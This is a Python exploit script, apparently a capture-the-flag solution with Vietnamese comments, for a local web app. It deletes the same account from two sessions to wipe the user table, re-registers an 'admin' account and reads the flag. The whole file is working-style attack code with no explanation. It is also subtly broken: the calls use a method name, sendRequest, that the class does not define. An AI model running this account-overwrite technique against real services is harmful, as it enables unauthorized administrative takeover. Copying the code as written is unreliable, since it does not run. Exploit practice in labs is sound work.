import requests
from base64 import b64encode
from bs4 import BeautifulSoup

class Exploit:
    def __init__(self, baseUrl, isLocal, basicAuthUsername, basicAuthPassword):
        self.baseUrl = baseUrl
        self.isLocal = isLocal
        self.basicAuthUsername = basicAuthUsername
        self.basicAuthPassword = basicAuthPassword

    def basicAuth(self):
        token = b64encode(f'{self.basicAuthUsername}:{self.basicAuthPassword}'.encode('utf-8')).decode('ascii')
        return f'Basic {token}'
    
    def sendRequests(self, session, method, endpoint, data=None):
        isPostMethod = True if method.lower() == 'post' else False
        isGetMethod = True if method.lower() == 'get' else False
        headers = {'Authorization': self.basicAuth()} if self.basicAuthUsername is not None and self.basicAuthPassword is not None else None

        if isPostMethod:
            if self.isLocal:
                response = session.post(f'{self.baseUrl}{endpoint}', data=data)
                return response.text
            response = session.post(f'{self.baseUrl}{endpoint}', data=data, headers=headers)
            return response.text
        if isGetMethod:
            if self.isLocal:
                response = session.get(f'{self.baseUrl}{endpoint}')
                return response.text

if __name__ == "__main__":
    isLocal = True
    basicAuthUsername = None
    basicAuthPassword = None
    BASE_URL = "http://127.0.0.1:8600/"
    exploit = Exploit(BASE_URL, isLocal, basicAuthUsername, basicAuthPassword)
    
    session1 = requests.Session()
    session2 = requests.Session()
    # Đăng kí
    username = 'foo'
    password = 'bar'
    registerData = {
        'username': username,
        'password': password,
        'profile': 'foobar'
    }
    print(f'[*] Registering new account "{username}" in session 1')
    exploit.sendRequest(session1, 'POST', '/register', registerData)

    # Đăng nhập với 2 session khác nhau
    loginData = {
        'username': username,
        'password': password
    }
    print(f'[*] Logging in to new account "{username}" in session 1')
    exploit.sendRequest(session1, 'POST', '/login', loginData)
    print(f'[*] Logging in to new account "{username}" in session 2')
    exploit.sendRequest(session2, 'POST', '/login', loginData)
    # Delete the first and second session's user
    deleteUserEndpoint = f'/user/{username}/delete'
    print(f'[*] Deleting new account "{username}" in session 1')
    exploit.sendRequest(session1, 'POST', deleteUserEndpoint)
    print(f'[*] Deleting new account "{username}" in session 2')
    exploit.sendRequest(session2, 'POST', deleteUserEndpoint)

    # Register our new "admin" user as the `Users` table is deleted
    overwriteAdminUserData = {
        'username': 'admin',
        'password': 'admin',
        'profile': 'never_gonna_give_you_up'
    }
    print(f'[*] Overwriting old admin user in session 1')
    overwriteAdminUserResponse = exploit.sendRequest(session1, 'POST', '/register', overwriteAdminUserData)
    if 'user exists' in overwriteAdminUserResponse:
        print(f'[-] Failed to overwrite the admin user...')
        exit()

    # Get the flag từ user admin
    print(f'[*] Getting the flag in session 1')
    flagResponse = exploit.sendRequest(session1, 'GET', '/flag')
    if 'The flag is:' not in flagResponse:
        print(f'[-] Failed to get the flag...')
        exit()

    soup = BeautifulSoup(flagResponse, 'html.parser')
    flag = soup.code.get_text()
    print(f'[+] Flag: {flag}')